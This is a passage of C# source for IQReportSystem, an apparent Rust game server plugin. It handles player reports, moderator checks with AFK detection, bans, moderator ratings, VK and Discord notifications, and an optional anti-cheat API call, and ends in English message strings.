_HELP_MODERS_VK", this), target.displayName, User.ReportCount));
                    DiscordSendMessage(String.Format(lang.GetMessage("METODS_HELP_MODERS_VK", this), target.displayName, User.ReportCount));
                }
        }

        #endregion

        #region MetodsCooldown
        void Metods_GiveCooldown(ulong ID,  int cooldown)
        {
            CooldownPC[ID] = cooldown + (int)CurrentTime();          
        }

        bool Metods_GetCooldown(ulong ID)
        {
            if (!CooldownPC.ContainsKey(ID) || Math.Max(0, CooldownPC[ID]) < 1 || CooldownPC[ID] <= (int)CurrentTime())
                return false;
            else return true;
        }

        #endregion

        #region MetodsModeration

        void Metods_CheckModeration(BasePlayer Suspect, BasePlayer Moderator)
        {
            if (PlayerSaveCheck.ContainsKey(Suspect.userID))
            {
                SendChat(Moderator, lang.GetMessage("PLAYER_CHECKED", this));
                return;
            }
            else PlayerSaveCheck.Add(Suspect.userID, new PlayerSaveCheckClass {  });
            SendChat(Moderator, String.Format(lang.GetMessage("METODS_MODER_START_CHECK",this, Moderator.UserIDString),Suspect.displayName));
            VKSendMessage(String.Format(lang.GetMessage("METODS_MODER_START_CHECK_VK", this),Moderator.displayName,Moderator.UserIDString,Suspect.displayName,Suspect.UserIDString));           
            Metods_AFK(Suspect.userID, Moderator);

            if(config.Setting.UseAlertUsers)
                foreach(var p in BasePlayer.activePlayerList)
                    SendChat(p, String.Format(lang.GetMessage("METODS_MODER_START_CHECK_VK", this, p.UserIDString), Moderator.displayName, Moderator.UserIDString, Suspect.displayName, Suspect.UserIDString));
        }

        void Metods_CheckModerationFinish(BasePlayer moderator, ulong SuspectID)
        {
            IPlayer Suspect = covalence.Players.FindPlayerById(SuspectID.ToString());
            if (Suspect.IsConnected)
            {
                BasePlayer SOnline = BasePlayer.FindByID(ulong.Parse(Suspect.Id));
                CuiHelper.DestroyUi(SOnline, PARENT_UI_ALERT_SEND);
                SendChat(SOnline, lang.GetMessage("MSG_CHECK_CHECK_STOP", this, moderator.UserIDString));
            }

            CuiHelper.DestroyUi(moderator, PARENT_UI_MODERATOR_MINI_PANEL);
            PlayerSaveCheck.Remove(ulong.Parse(Suspect.Id));

            var User = ReportInformation[ulong.Parse(Suspect.Id)];
            var Moderator = ModeratorInformation[moderator.userID];

            Moderator.CheckCount++;
            if (!Moderator.CheckPlayerModerator.ContainsKey(Suspect.Name))
                Moderator.CheckPlayerModerator.Add(Suspect.Name, User.LastReport);

            User.ReportCount = 0;
            User.ReportHistory.Clear();
            User.LastReport = lang.GetMessage("NON_REPORT",this);
            User.CheckCount++;
            User.LastCheckModerator = moderator.displayName;

            SendChat(moderator, lang.GetMessage("METODS_MODER_STOP_CHECK",this, moderator.UserIDString));
            VKSendMessage(String.Format(lang.GetMessage("METODS_MODER_STOP_CHECK_VK",this),moderator.displayName));
            DiscordSendMessage(String.Format(lang.GetMessage("METODS_MODER_STOP_CHECK_VK",this),moderator.displayName));
            SetCheck(moderator);

            if (config.Setting.UseAlertUsers)
                foreach (var p in BasePlayer.activePlayerList)
                    SendChat(p, String.Format(lang.GetMessage("METODS_MODER_STOP_CHECK_ALERT", this, p.UserIDString), moderator.displayName, Suspect.Name));
        }

        void Metods_StatusNetwork(BasePlayer Suspect, string Reason)
        {
            if (Suspect == null) return;
            if (PlayerSaveCheck.ContainsKey(Suspect.userID))
            {
                if (Suspect.IsConnected)
                    if (Suspect.IsReceivingSnapshot)
                    {
                        timer.Once(3, () => Metods_StatusNetwork(Suspect, lang.GetMessage("NETWORD_STATUS_ONLINE", this, Suspect.UserIDString)));
                        return;
                    }

                PlayerSaveCheck[Suspect.userID].StatusNetwork = Reason;
                BasePlayer Moderator = BasePlayer.FindByID(PlayerSaveCheck[Suspect.userID].ModeratorID);

                CuiHelper.DestroyUi(Moderator, UI_MODERATION_CHECK_MENU_NETWORK);
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.6782616 0.5478261", AnchorMax = "0.9884076 0.7333333" },
                    Text = { Text = $"{PlayerSaveCheck[Suspect.userID].StatusNetwork}", FontSize = 12, Font = "robotocondensed-regular.ttf", Align = TextAnchor.UpperCenter, Color = HexToRustFormat("#FFFFFFFF") }
                }, PARENT_UI_MODERATOR_MINI_PANEL, UI_MODERATION_CHECK_MENU_NETWORK);

                CuiHelper.AddUi(Moderator, container);
                UI_AlertSendPlayer(Suspect);             

                SendChat(Moderator, String.Format(lang.GetMessage("STATUS_CHANGED", this, Moderator.UserIDString), Suspect.displayName, Reason));
                VKSendMessage(String.Format(lang.GetMessage("STATUS_CHANGED_VK", this), Suspect.displayName, Reason));
                DiscordSendMessage(String.Format(lang.GetMessage("STATUS_CHANGED_VK", this), Suspect.displayName, Reason));
            }
        }

        public Timer ModerTimeOutTimer;
        void Metods_ModeratorExitCheck(BasePlayer Moderator)
        {
            foreach (var ModeratorCritical in PlayerSaveCheck)
                if (ModeratorCritical.Value.ModeratorID == Moderator.userID)
                {
                    IPlayer ModeratorOffline = covalence.Players.FindPlayerById(ModeratorCritical.Value.ModeratorID.ToString());
                    IPlayer Suspect = covalence.Players.FindPlayerById(ModeratorCritical.Key.ToString());
                    int TimeOutCount = 0;
                    ModerTimeOutTimer = timer.Repeat(5, 10, () =>
                        {
                            if (ModeratorOffline.IsConnected)
                            {
                                UI_MiniPanelModerator(Moderator, ModeratorCritical.Key);
                                SendChat(Moderator, lang.GetMessage("MODERATOR_RETURN_WELCOME",this, Moderator.UserIDString));
                                if (ModerTimeOutTimer != null)
                                {
                                    ModerTimeOutTimer.Destroy();
                                    ModerTimeOutTimer = null;
                                }
                                return;
                            }
                            else
                            {
                                TimeOutCount++;
                                if (TimeOutCount >= 10)
                                {
                                    PlayerSaveCheck.Remove(ModeratorCritical.Key);

                                    foreach (var OnlineModeration in BasePlayer.activePlayerList)
                                        if (permission.UserHasPermission(OnlineModeration.UserIDString, PermissionModeration))
                                            if (Suspect.IsConnected)
                                            {                                             
                                                BasePlayer SOnline = BasePlayer.FindByID(ulong.Parse(Suspect.Id));
                                                CuiHelper.DestroyUi(SOnline, PARENT_UI_ALERT_SEND);
                                           
                                                SendChat(SOnline, String.Format(lang.GetMessage("MODERATOR_DISCONNECTED_STOP_CHECK",this, Moderator.UserIDString),ModeratorOffline.Name));
                                                SendChat(OnlineModeration, String.Format(lang.GetMessage("MODERATOR_DISCONNECTED_STOP_RESEND",this, Moderator.UserIDString),ModeratorOffline.Name,Suspect.Name));
                                                VKSendMessage(String.Format(lang.GetMessage("MODERATOR_DISCONNECTED_STOP_RESEND", this), ModeratorOffline.Name, Suspect.Name));
                                                DiscordSendMessage(String.Format(lang.GetMessage("MODERATOR_DISCONNECTED_STOP_RESEND", this), ModeratorOffline.Name, Suspect.Name));

                                                if (ModerTimeOutTimer != null)
                                                {
                                                    ModerTimeOutTimer.Destroy();
                                                    ModerTimeOutTimer = null;
                                                }
                                            }
                                    return;
                                }
                            }
                        });

                }
        }

        void Metods_ModeratorBanned(BasePlayer Moderator,ulong SuspectID, int i)
        {
            CuiHelper.DestroyUi(Moderator, PARENT_UI_MODERATOR_MINI_PANEL);
            IPlayer Suspect = covalence.Players.FindPlayerById(SuspectID.ToString());
            string Reason = config.ReasonBan[i].DisplayName;

            rust.RunClientCommand(Moderator, String.Format(config.ReasonBan[i].Command, SuspectID));
            PlayerSaveCheck.Remove(SuspectID);

            var ModeratorInfo = ModeratorInformation[Moderator.userID];
            ModeratorInfo.CheckCount++;
            if (!ModeratorInfo.CheckPlayerModerator.ContainsKey(Suspect.Name))
                ModeratorInfo.CheckPlayerModerator.Add(Suspect.Name, Reason);
            if (!ModeratorInfo.BanPlayerModerator.ContainsKey(Suspect.Name))
                ModeratorInfo.BanPlayerModerator.Add(Suspect.Name, Reason);

            SendChat(Moderator, String.Format(lang.GetMessage("MODERATOR_COMPLETED_CHECK", this, Moderator.UserIDString), Reason));
            VKSendMessage(String.Format(lang.GetMessage("MODERATOR_COMPLETED_CHECK_VK", this), Moderator.displayName, Moderator.UserIDString, Suspect.Name, SuspectID, Reason, AFKCheck[SuspectID]));
            DiscordSendMessage(String.Format(lang.GetMessage("MODERATOR_COMPLETED_CHECK_VK", this), Moderator.displayName, Moderator.UserIDString, Suspect.Name, SuspectID, Reason, AFKCheck[SuspectID]));
            SetBans(Moderator);

            if (config.Setting.UseAlertUsers)
                foreach (var p in BasePlayer.activePlayerList)
                    SendChat(p, String.Format(lang.GetMessage("MODERATOR_COMPLETED_CHECK_ALERT", this, p.UserIDString), Moderator.displayName, Suspect.Name, Reason));
        }

        #endregion

        #region MetodsAFK
        void Metods_CheckStopInAFK(BasePlayer moderator, string ID)
        {
            IPlayer Suspect = covalence.Players.FindPlayerById(ID);
            if (Suspect.IsConnected)
            {
                BasePlayer SOnline = BasePlayer.FindByID(ulong.Parse(Suspect.Id));
                CuiHelper.DestroyUi(SOnline, PARENT_UI_ALERT_SEND);
            }
            CuiHelper.DestroyUi(moderator, PARENT_UI_MODERATOR_MINI_PANEL);
            PlayerSaveCheck.Remove(ulong.Parse(Suspect.Id));

            SendChat(moderator, lang.GetMessage("PLAYER_AFK_CHECK_STOP",this));
            VKSendMessage(String.Format(lang.GetMessage("PLAYER_AFK_CHECK_STOP_VK", this), moderator.displayName, moderator.userID, Suspect.Name));
            DiscordSendMessage(String.Format(lang.GetMessage("PLAYER_AFK_CHECK_STOP_VK", this), moderator.displayName, moderator.userID, Suspect.Name));
        }

        public Dictionary<ulong,int> AFKCheck = new Dictionary<ulong, int>();
        void Metods_AFK(ulong SuspectID, BasePlayer moderator)
        {
            IPlayer Suspect = covalence.Players.FindPlayerById(SuspectID.ToString());
            if (!AFKCheck.ContainsKey(SuspectID))
                AFKCheck.Add(SuspectID, 0);
            else AFKCheck[SuspectID] = 0;

            int tryAFK = 0;
            SavePositionAFK(Suspect, moderator, tryAFK);
            timer.Repeat(5f, 6, () =>
            {
                SavePositionAFK(Suspect, moderator,tryAFK);
                tryAFK++;
            });
        }

        readonly Hash<string, GenericPosition> lastPosition = new Hash<string, GenericPosition>();
        void SavePositionAFK(IPlayer Suspect, BasePlayer moderator, int num)
        {
            var pPosition = Suspect.Position();
            if (!lastPosition.ContainsKey(Suspect.Id))
                lastPosition.Add(Suspect.Id, pPosition);
            else
            {
                if (lastPosition[Suspect.Id] != pPosition)
                    SendChat(moderator, String.Format(lang.GetMessage("PLAYER_AFK_CHANGE_POS",this, moderator.UserIDString),num));
                else
                {
                    SendChat(moderator, String.Format(lang.GetMessage("PLAYER_AFK_CHANGE_NO_POS", this, moderator.UserIDString), num));
                    AFKCheck[ulong.Parse(Suspect.Id)] += 1;
                }
                lastPosition[Suspect.Id] = pPosition;
            }

            if (num >= 5)
            {
                if (AFKCheck[ulong.Parse(Suspect.Id)] >= 3)
                    Metods_CheckStopInAFK(moderator, Suspect.Id);
                else
                {
                    BasePlayer SuspectOnline = BasePlayer.FindByID(ulong.Parse(Suspect.Id));
                    UI_AlertSendPlayer(SuspectOnline);
                    PlayerSaveCheck = new Dictionary<ulong, PlayerSaveCheckClass>
                    {
                        [SuspectOnline.userID] = new PlayerSaveCheckClass
                        {
                            Discord = lang.GetMessage("DISCORD_NULL",this),
                            NickName = SuspectOnline.displayName,
                            StatusNetwork = lang.GetMessage("NETWORD_STATUS_ONLINE", this, SuspectOnline.UserIDString),

                            ModeratorID = moderator.userID,
                        }
                    };
                    UI_MiniPanelModerator(moderator, SuspectOnline.userID);
                    SendChat(moderator, lang.GetMessage("PLAYER_NON_AFK", this, moderator.UserIDString));
                    
                    if(config.RCCSetting.RCCUse)
                    {
                        string Key = config.RCCSetting.Key;
                        if (String.IsNullOrEmpty(Key)) return;
                        try
                        {
                            string API = $"https://rustcheatcheck.ru/panel/api?action=addPlayer&key={Key}&player={Suspect.Id}";
                            webrequest.Enqueue(API, null, (code, response) => { }, this);
                        }
                        catch { }
                    }
                }
            }
        }

        #endregion

        #endregion

        #region Command

        #region UseCommand
        [ChatCommand("report")]
        void ReportChatCommand(BasePlayer player, string command, string[] args)
        {
            if (player == null)
                return;

            if (args == null || args.Length == 0)
            {
                rust.RunClientCommand(player, "custommenu true Report");
                return;
            }
        }

        [ConsoleCommand("report.list")]
        void ReportList(ConsoleSystem.Arg arg)
        {
            PrintError(lang.GetMessage("REPORT_LIST_CONSOLE",this));
            foreach (var List in BasePlayer.activePlayerList)
                if (ReportInformation[List.userID].ReportCount >= config.Setting.MaxReport)
                    PrintError($"{List.displayName} : {ReportInformation[List.userID].ReportCount}");

        }

        [ChatCommand("discord")]
        void SendDiscord(BasePlayer Suspect, string command, string[] args)
        {
            if (!PlayerSaveCheck.ContainsKey(Suspect.userID))
            {
                SendChat(Suspect, lang.GetMessage("MSG_CHECK_DISCORD", this, Suspect.UserIDString));
                return;
            }
            string Discord = "";
            foreach (var arg in args)
                Discord += " " + arg;

            PlayerSaveCheck[Suspect.userID].Discord = Discord;

            SendChat(Suspect, String.Format(lang.GetMessage("MSG_DISCORD_SEND", this, Suspect.UserIDString),Discord));
            VKSendMessage(String.Format(lang.GetMessage("DISCROD_VK_SEND", this), Suspect.displayName, Suspect.userID, Discord));
            DiscordSendMessage(String.Format(lang.GetMessage("DISCROD_VK_SEND", this), Suspect.displayName, Suspect.userID, Discord));

            BasePlayer Moderator = BasePlayer.FindByID(PlayerSaveCheck[Suspect.userID].ModeratorID);
            CuiHelper.DestroyUi(Moderator, UI_MODERATION_CHECK_MENU_DISCORD);
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.01159436 0.5478261", AnchorMax = "0.7072465 0.7333333" },
                Text = { Text = $"Discord : {PlayerSaveCheck[Suspect.userID].Discord}", FontSize = 12, Font = "robotocondensed-regular.ttf", Align = TextAnchor.UpperCenter, Color = HexToRustFormat("#FFFFFFFF") }
            }, PARENT_UI_MODERATOR_MINI_PANEL, UI_MODERATION_CHECK_MENU_DISCORD);

            CuiHelper.AddUi(Moderator, container);
        }
       
        [ConsoleCommand("call")]
        void CallAdminCheck(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            if (!player.IsAdmin) return;
            ulong SuspectID = ulong.Parse(arg.Args[0]);
            if(player == null)
            {
                PrintWarning("Вы должны быть на сервере");
                SendChat(player, "Вы должны быть на сервере");
                return;
            }
            BasePlayer Suspect = BasePlayer.FindByID(SuspectID);
            if(Suspect == null)
            {
                PrintWarning("Игрока нет");
                SendChat(player, "Игрока нет");
                return;
            }
            Metods_CheckModeration(Suspect, player);
            Puts("Вы вызвали игрока на проверку"); 
            SendChat(player, "Вы вызвали игрока на проверку");
        }

        [ConsoleCommand("report")]
        void ReportCommand(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();

            if (arg == null || arg.Args == null || arg.Args.Length == 0)
            {
                if (player == null) return;
                rust.RunClientCommand(player, "custommenu true Report");
                return;
            }

            switch (arg.Args[0].ToLower())
            {
                case "give":
                    {
                        if (arg.Args.Length != 3)
                        {
                            PrintWarning("Используйте правильный синтаксис : report give SteamID Amount");
                            return;
                        }
                        if (string.IsNullOrWhiteSpace(arg.Args[1]))
                        {
                            PrintWarning("Укажите корректный Steam64ID");
                            return;
                        }
                        if (!arg.Args[1].IsSteamId())
                        {
                            PrintWarning("Укажите корректный Steam64ID");
                            return;
                        }
                        if (string.IsNullOrWhiteSpace(arg.Args[2]))
                        {
                            PrintWarning("Укажите корректное количество");
                            return;
                        }

                        ReportInformation[ulong.Parse(arg.Args[1])].ReportCount += Convert.ToInt32(arg.Args[2]);
                        if (player != null)
                        {
                            VKSendMessage(String.Format(lang.GetMessage("CONSOLE_REPORT_GIVE", this), arg.Args[1], arg.Args[2], ReportInformation[ulong.Parse(arg.Args[1])].ReportCount));
                            DiscordSendMessage(String.Format(lang.GetMessage("CONSOLE_REPORT_GIVE", this), arg.Args[1], arg.Args[2], ReportInformation[ulong.Parse(arg.Args[1])].ReportCount));
                        }
                        PrintWarning("ACCESS");
                        return;
                    }
                case "remove":
                    {
                        if (arg.Args.Length != 3)
                        {
                            PrintWarning("Используйте правильный синтаксис : report remove SteamID Amount");
                            return;
                        }
                        if (string.IsNullOrWhiteSpace(arg.Args[1]))
                        {
                            PrintWarning("Укажите корректный Steam64ID");
                            return;
                        }
                        if (!arg.Args[1].IsSteamId())
                        {
                            PrintWarning("Укажите корректный Steam64ID");
                            return;
                        }
                        if (string.IsNullOrWhiteSpace(arg.Args[2]))
                        {
                            PrintWarning("Укажите корректное количество");
                            return;
                        }
                        ReportInformation[ulong.Parse(arg.Args[1])].ReportCount -= Convert.ToInt32(arg.Args[2]);
                        if (player != null)
                        {
                            VKSendMessage(String.Format(lang.GetMessage("CONSOLE_REPORT_REMOVE", this), arg.Args[1], arg.Args[2], ReportInformation[ulong.Parse(arg.Args[1])].ReportCount));
                        }
                        PrintWarning("ACCESS");
                        return;
                    }
            }
        }

        #endregion

        #region FuncCommand
        [ConsoleCommand("iqreport")]
        void IQReportSystemCommands(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            string Key = arg.Args[0].ToLower();

            switch (Key)
            {
                case "page":
                    {
                        string PageAction = arg.Args[1];
                        bool Moderation = Convert.ToBoolean(arg.Args[2]);
                        int Page = Convert.ToInt32(arg.Args[3]);
                        switch (PageAction)
                        {
                            case "next":
                                {
                                    UI_Player_Loaded(player, Moderation, Page + 1);
                                    break;
                                }
                            case "back":
                                {
                                    UI_Player_Loaded(player, Moderation, Page - 1);
                                    break;
                                }
                        }
                        break;
                    };
                case "moderation_menu":
                    {
                        UI_PanelReportsPlayer(player, true);
                        break;
                    };
                case "reports_menu":
                    {
                        //  int BaseID = int.Parse(arg.Args[1]);
                        
                        ulong UserID = ulong.Parse(arg.Args[1]);
                        UI_SendReport(player, UserID);
                        break;
                    }
                case "moderation_send":
                    {
                        ulong SuspectID = ulong.Parse(arg.Args[1]);
                        BasePlayer Suspect = BasePlayer.FindByID(SuspectID);

                        UI_ModerReport(player, Suspect);
                        break;
                    }
                case "send_report":
                    {
                        ulong SuspectID = ulong.Parse(arg.Args[1]);
                        int IndexReason = Convert.ToInt32(arg.Args[2]);
                        string ReasonReport = config.ReasonReport[IndexReason];

                        if (player == null) return;
                        

                        if (Metods_GetCooldown(player.userID) == true)
                        {
                            SendChat(player, String.Format(lang.GetMessage("MSG_COOLDOWN", this, player.UserIDString), FormatTime(TimeSpan.FromSeconds(Math.Max(0, CooldownPC[player.userID] - CurrentTime())))));
                            CuiHelper.DestroyUi(player, "XMenu");
                            return;
                        }
                        
                        if(IsFake(SuspectID))
                        {
                            Metods_GiveCooldown(player.userID, config.Setting.CooldownTime);
                            SendChat(player, String.Format(lang.GetMessage("MSG_REPORTED_SUSPECT", this, player.UserIDString), FindFakeName(SuspectID), ReasonReport));
                            CuiHelper.DestroyUi(player, "XMenu");
                            return;
                        }
                        BasePlayer Suspect = BasePlayer.FindByID(SuspectID);
                        if (Suspect == null) return;

                        Metods_Report(Suspect, IndexReason);
                        Metods_GiveCooldown(player.userID, config.Setting.CooldownTime);
                        SendChat(player, String.Format(lang.GetMessage("MSG_REPORTED_SUSPECT", this, player.UserIDString), Suspect.displayName, ReasonReport));
                        VKSendMessage(String.Format(lang.GetMessage("METODS_SEND_REPORT_VK", this), Suspect.displayName, Suspect.UserIDString, ReasonReport, player.displayName, player.userID));
                        DiscordSendMessage(String.Format(lang.GetMessage("METODS_SEND_REPORT_VK", this), Suspect.displayName, Suspect.UserIDString, ReasonReport, player.displayName, player.userID));
                        CuiHelper.DestroyUi(player, "XMenu");
                        break;
                    }
                case "search":
                    {
                        if (arg.Args.Length != 4) return;

                        bool Moderation = Convert.ToBoolean(arg.Args[1]);
                        int Page = Convert.ToInt32(arg.Args[2]);
                        string SearchSay = arg.Args[3];

                        UI_Player_Loaded(player, Moderation, Page, SearchSay);
                        break;
                    }
                case "send_check":
                    {
                        if (player == null) return;
                        ulong SuspectID = ulong.Parse(arg.Args[1]);
                        BasePlayer Suspect = BasePlayer.FindByID(SuspectID);
                        if (permission.UserHasPermission(player.UserIDString, PermissionModeration))
                            Metods_CheckModeration(Suspect, player);

                        break;
                    }
                case "moderator_reason_ban":
                    {
                        if (player == null) return;
                        ulong SuspectID = ulong.Parse(arg.Args[1]);
                        BasePlayer Suspect = BasePlayer.FindByID(SuspectID);
                        if (permission.UserHasPermission(player.UserIDString, PermissionModeration))
                            UI_OpenReasonsBan(player, SuspectID);
                        break;
                    }
                case "moderator_ban":
                    {
                        if (player == null) return;
                        ulong SuspectID = ulong.Parse(arg.Args[1]);
                        BasePlayer Suspect = BasePlayer.FindByID(SuspectID);
                        int Index = Convert.ToInt32(arg.Args[2]);
                        Metods_ModeratorBanned(player, SuspectID, Index);
                        break;
                    }
                case "moderator_stop":
                    {
                        if (player == null) return;
                        ulong SuspectID = ulong.Parse(arg.Args[1]);
                        BasePlayer Suspect = BasePlayer.FindByID(SuspectID);
                        if (permission.UserHasPermission(player.UserIDString, PermissionModeration))
                            Metods_CheckModerationFinish(player, SuspectID);
                        UI_RaitingSend(Suspect, player);
                        return;
                    }
                case "raiting": 
                    {
                        BasePlayer Moderator = BasePlayer.FindByID(ulong.Parse(arg.Args[1]));
                        int Raiting = Convert.ToInt32(arg.Args[2]);
                        var RaitingModerator = ModeratorInformation[Moderator.userID].Arrayrating;

                        VKSendMessage(String.Format(lang.GetMessage("UI_RAITING_MODERATION_VK_GIVE", this), player.displayName, player.UserIDString, Moderator.displayName, Moderator.UserIDString, Raiting));
                        DiscordSendMessage(String.Format(lang.GetMessage("UI_RAITING_MODERATION_VK_GIVE", this), player.displayName, player.UserIDString, Moderator.displayName, Moderator.UserIDString, Raiting));
                        SendChat(player, lang.GetMessage("UI_RAITING_MODERATION_VK_GIVE_THX", this, player.UserIDString));

                        RaitingModerator.Add(Raiting);

                        if (Raiting <= 2)
                        {
                            RemoveScore(Moderator.userID, config.RaitingSetting.RemoveAmountOneTwo);
                            SendChat(Moderator, String.Format(lang.GetMessage("UI_RAIT_ALERT_MODER", this, Moderator.UserIDString), Raiting, $"-{config.RaitingSetting.RemoveAmountOneTwo}"));
                            return;
                        }
                        if (Raiting > 2 && Raiting < 5)
                        {
                            SetScore(Moderator.userID, config.RaitingSetting.GiveAmountThreeFour);
                            SendChat(Moderator, String.Format(lang.GetMessage("UI_RAIT_ALERT_MODER", this, Moderator.UserIDString), Raiting, $"{config.RaitingSetting.GiveAmountThreeFour}"));
                            return;
                        }
                        if (Raiting >= 5)
                        {
                            SetScore(Moderator.userID, config.RaitingSetting.GiveAmountFive);
                            SendChat(Moderator, String.Format(lang.GetMessage("UI_RAIT_ALERT_MODER", this, Moderator.UserIDString), Raiting, $"{config.RaitingSetting.GiveAmountFive}"));
                            return;
                        }
                        break;
                    }
            }
        }
        #endregion

        public float GetAverageRaiting(ulong userID)
        {
            var Data = ModeratorInformation[userID];
            float AverageRaiting = Data.AverageRating;
            int RaitingFull = 0;
            for(int i = 0; i < Data.Arrayrating.Count; i++)
                RaitingFull += Data.Arrayrating[i];

            int FormulDivision = Data.Arrayrating.Count == 0 ? 1 : Data.Arrayrating.Count;
            AverageRaiting = RaitingFull / FormulDivision;
            return AverageRaiting;
        }

        #endregion

        #region Lang
        private new void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["PLAYER_CHECKED"] = "The player had already check!",

                ["MSG_REPORTED_SUSPECT"] = "You have successfully submitted a player report - {0}\nReported : {1}\nThe moderator will review your complaint as soon as possible!",
                ["MSG_CHECK_DISCORD"] = "You can't send Discord without checking!",
                ["MSG_CHECK_CHECK_STOP"] = "You have successfully passed the test!\nWe wish you a pleasant game on our server!",
                ["MSG_COOLDOWN"] = "You have recently sent a complaint!\nWait <color=#47AF5DFF>{0}</color>",
                ["MSG_DISCORD_SEND"] = "You have successfully submitted the information!\nDiscord - {0}\nExpect a call from the moderator",

                ["UI_MODERATOR_PANEL_TITLE"] = "Server moderator menu",
                ["UI_MODERATOR_PANEL_DESCRIPTION"] = "This list shows players who have reached the limit of complaints,click on the player to get more information",
                ["UI_MODERATOR_PANEL_START_CHECK"] = "Call for verification",
                ["UI_STATUS"] = "Status",

                ["NETWORD_STATUS_ONLINE"] = "Online",
                ["IS_STEAM_STATUS_PIRATE"] = "Pirate",
                ["IS_STEAM_STATUS_LICENSE"] = "License",

                ["METODS_SEND_REPORT_VK"] = "[IQReportSystem]\nA complaint has been sent to player {0} ({1})!\nComplaint - {2}\nReporter : {3}({4})",
                ["METODS_HELP_MODERS"] = "Player <color=#47AF5DFF>{0}</color> reached the limit of reports!\nThe number of his reports - <color=#47AF5DFF>{1}</color>\nModeration that is free - check the player!",
                ["METODS_HELP_MODERS_VK"] = "[IQReportSystem]\nPlayer {0} reached the limit of reports!\nThe number of his reports - {1}\nModeration that is free - check the player!",
                ["METODS_MODER_START_CHECK"] = "You started checking!\nSuspect - <color=#47AF5DFF>{0}</color>\nGetting started with AFK!\nIf the player is not AFK, they will receive a notification of verification!",
                ["METODS_MODER_START_CHECK_VK"] = "[IQReportSystem]\nModerator {0}({1}) started checking!\nSuspect - {2}({3})",
                ["METODS_MODER_STOP_CHECK"] = "Verification completed.\nHave a nice day!\nDo not forget to check the complaint list!",
                ["METODS_MODER_STOP_CHECK_VK"] = "[IQReportSystem]\nModerator {0} finished checking!",
                ["METODS_MODER_STOP_CHECK_ALERT"] = "Moderator {0} has finished Player check - {1}\nNo illegal found",

                ["NON_REPORT"] = "No complaints",
                ["MODERATOR_RETURN_WELCOME"] = "Welcome back!\nthe check was not canceled, continue!",
                ["STATUS_CHANGED"] = "The player's {0} status has changed to: {1}\n Wait for the player on the server for 10 minutes!\nIf the player does not enter after 10 minutes-issue a ban for Refusal",
                ["STATUS_CHANGED_VK"] = "[IQReportSystem]The player's {0} status has changed to: {1}\n Wait for the player on the server for 10 minutes!\nIf the player does not enter after 10 minutes-issue a ban for Refusal",
                ["MODERATOR_DISCONNECTED_STOP_CHECK"] = "The check was removed!\nModerator {0} left the server\nReason: connection Failure\nWe apologize!\nWe will inform the other moderation!",
                ["MODERATOR_DISCONNECTED_STOP_RESEND"] = "Moderator {0} finally left the server during verification!\n Player {1} is waiting for other moderators to check!",
                ["MODERATOR_COMPLETED_CHECK"] = "You successfully completed the review and delivered your verdict\nYour verdict : {0}",
                ["MODERATOR_COMPLETED_CHECK_ALERT"] = "Moderator {0} successfully completed the review  {1}\nVerdict: {2}",
                ["MODERATOR_COMPLETED_CHECK_VK"] = "[[IQ Report System]\nModerator {0}[(1)] finished checking \nSuspect {2}[{3}]\nVerdict : {4}\n[AFK Check]Player didn't move : {5}/5",
                ["PLAYER_AFK_CHECK_STOP"] = "Suspect AFK\nThe check is removed automatically!",
                ["PLAYER_AFK_CHECK_STOP_VK"] = "[IQReportSystem]\nModerator {0}({1}) checking the player {2}.\nThe AFK suspect and the check was removed!",
                ["PLAYER_AFK_CHANGE_POS"] = "The player was moving! Check {0}/5",
                ["PLAYER_AFK_CHANGE_NO_POS"] = "The player didn't move! Check {0}/5",
                ["PLAYER_NON_AFK"] = "The player moves.\nProverite on!",
                ["DISCORD_NULL"] = "Not provided",
                ["REPORT_LIST_CONSOLE"] = "\n[IQReportSystem]:\nList of players in the Moderation Panel",
                ["DISCROD_VK_SEND"] = "[IQReportSystem]\nSuspect {0}({1}) provided Discord for verification!\nDiscord - {2}",
                ["CONSOLE_REPORT_GIVE"] = "Player {0} is successfully added to the report in the amount of {1}. Its number is - {2}",
                ["CONSOLE_REPORT_REMOVE"] = "Player {0} successfully removed reports in the amount of - {1} His number is - {2}",
                ["MODERATOR_NON_OPEN_MENU"] = "You can't open the moderator menu when checking a player!\nFinish checking!",
                ["UI_RAITING_MODERATION_VK_GIVE"] = "[IQReportSystem]:\nPlayer {0}({1}) rated the work of moderator {2}({3}) on {4} stars",
                ["UI_RAITING_MODERATION_VK_GIVE_THX"] = "Thx!",
                ["UI_RAIT_ALERT_MODER"] = "Your work has been rated with {0} stars. You gain {1} reputation.",

                ["UI_NEW_CHECKED_COUNT"] = "<size=14>CHECKED: {0}</size>",
                ["UI_NEW_CLOSE"] = "<size=24><b>CLOSE</b></size>",

                ["UI_NEW_MODERATION_TITLE_PANEL"] = "<size=18>PANEL MODERATION</size>",
                ["UI_NEW_MODERATION_REPORT_BTN"] = "<size=20><b>REPORTS</b></size>",

                ["UI_NEW_MODERATION_TITLE_STATS"] = "<size=18><b>CHECK STATISTICS</b></size>",
                ["UI_NEW_MODERATION_STATS_COUNTCHECK"] = "<size=8>NUMBER OF CHECKS: {0}</size>",
                ["UI_NEW_MODERATION_STATS_COUNTBANS"] = "<size=8>BLOCKEDS: {0}</size>",
                ["UI_NEW_MODERATION_STATS_STARS"] = "<size=15><b>QUALITY CONTROL : {0}</b></size>",

                ["UI_NEW_MODERATION_REPORT_PANEL_TITLE"] = "<size=70><b>REPORTS</b></size>",
                ["UI_NEW_MODERATION_REPORT_PANEL_DESCRIPTION"] = "<size=8>CHOOSE A PLAYER TO SEND TO IT'S COMPLAINT</size>",
                ["UI_NEW_MODERATION_REPORT_PANEL_SEARCH_DESCRIPTION"] = "<size=14>ENTER NICK OR STEAM64ID TO SEARCH A PLAYER</size>",
                ["UI_NEW_MODERATION_REPORT_PANEL_DESCRIPTION_MODERATOR"] = "<size=8>SELECT A PLAYER IN THE PANEL TO START A CHECK</size>",
                ["UI_NEW_MODERATION_REPORT_PANEL_SEARCH_TITLE"] = "<size=50><b>SEARCH</b></size>",

                ["UI_NEW_MODERATION_REPORT_PANEL_PLAYER_REPORTEDS"] = "<size=14><b>REPORTS : {0}</b></size>",

